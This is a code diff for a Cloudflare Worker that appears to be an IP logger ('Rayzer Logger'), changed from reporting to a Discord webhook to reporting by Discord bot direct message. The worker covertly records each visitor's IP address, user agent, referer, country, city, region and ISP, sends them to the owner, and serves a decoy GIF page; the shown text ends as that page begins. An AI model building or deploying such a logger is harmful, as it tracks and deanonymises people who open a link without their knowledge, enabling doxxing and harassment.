@@ -1,19 +1,19 @@
-// /cloudflare worker/variableversion.js
-
+// /cloudflare worker/DISCORD_BOT/worker-env.js
 
 export default {
     async fetch(request, env, ctx) {
-        const WEBHOOK_URL = env.WEBHOOK_URL;
+        const BOT_TOKEN = env.BOT_TOKEN;
+        const OWNER_ID = env.OWNER_ID;
         const GIF_URL = env.GIF_URL || "https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif";
 
-        if (!WEBHOOK_URL) {
-            return new Response("ERROR: WEBHOOK_URL environment variable not set!", { status: 500 });
+        if (!BOT_TOKEN || !OWNER_ID) {
+            return new Response("ERROR: BOT_TOKEN or OWNER_ID not set!", { status: 500 });
         }
 
         const ip = request.headers.get("cf-connecting-ip") || "Unknown";
-        const userAgent = request.headers.get("user-agent") || "Unknown";
-        const referer = request.headers.get("referer") || "Unknown";
-        const country = request.headers.get("cf-ipcountry") || "Unknown";
+        const userAgent = request.headers.get("user-agent") || "None";
+        const referer = request.headers.get("referer") || "None";
+        const country = request.headers.get("cf-ipcountry") || "None";
 
         let geoData = { city: "?", regionName: "?", country: country, isp: "?" };
 
@@ -26,10 +26,9 @@ export default {
         } catch (e) { }
 
         const payload = {
-            username: "Rayzer Logger",
             embeds: [{
-                title: "New Log 🔍",
-                color: 0x5865F2,
+                title: "New Log (Discord Bot DM) 🔍",
+                color: 0x5865f2,
                 fields: [
                     { name: "IP", value: `\`${ip}\``, inline: true },
                     { name: "Location", value: `${geoData.city}, ${geoData.regionName}, ${geoData.country}`, inline: true },
@@ -42,13 +41,32 @@ export default {
             }]
         };
 
-        ctx.waitUntil(
-            fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            })
-        );
+        const apiBase = "https://discord.com/api/v10";
+        const headers = {
+            "Content-Type": "application/json",
+            "Authorization": `Bot ${BOT_TOKEN}`
+        };
+
+        ctx.waitUntil((async () => {
+            try {
+                // 1. Create DM Channel with Owner
+                const dmRes = await fetch(`${apiBase}/users/@me/channels`, {
+                    method: "POST",
+                    headers: headers,
+                    body: JSON.stringify({ recipient_id: OWNER_ID })
+                });
+                const dmChannel = await dmRes.json();
+
+                if (dmChannel.id) {
+                    // 2. Send Message to DM Channel
+                    await fetch(`${apiBase}/channels/${dmChannel.id}/messages`, {
+                        method: "POST",
+                        headers: headers,
+                        body: JSON.stringify(payload)
+                    });
+                }
+            } catch (e) { }
+        })());
 
         return new Response(`
       <!DOCTYPE html>
